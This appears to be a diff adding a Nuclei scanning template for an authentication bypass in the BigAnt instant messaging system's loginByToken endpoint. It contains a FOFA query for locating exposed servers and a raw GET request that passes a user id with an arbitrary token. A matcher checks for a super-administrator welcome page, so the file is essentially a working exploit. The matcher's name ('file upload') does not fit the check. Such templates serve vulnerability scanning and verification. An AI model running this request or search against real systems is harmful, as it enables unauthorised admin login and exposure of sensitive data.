@@ -1,0 +1,27 @@
+id: DaMaYi-BigAnt-JiShiTongXunXiTong-loginByToken-Bypass
+
+info:
+  name: 大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 权限绕过
+  author: HuanXiong
+  severity: critical
+  description: |
+    fofa: (body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"
+    该系统的 loginByToken 接口存在逻辑错误，可导致权限绕过以任意用户身份登录进系统，从而造成系统敏感信息泄露，甚至系统权限丢失。
+  reference:
+    - 
+  tags: Bypass
+
+http:
+  - raw:
+      - |
+        GET /home/login/loginByToken?uid=4&token=asdasdasdadasadad HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        name: 文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'欢迎, 超级管理员')"
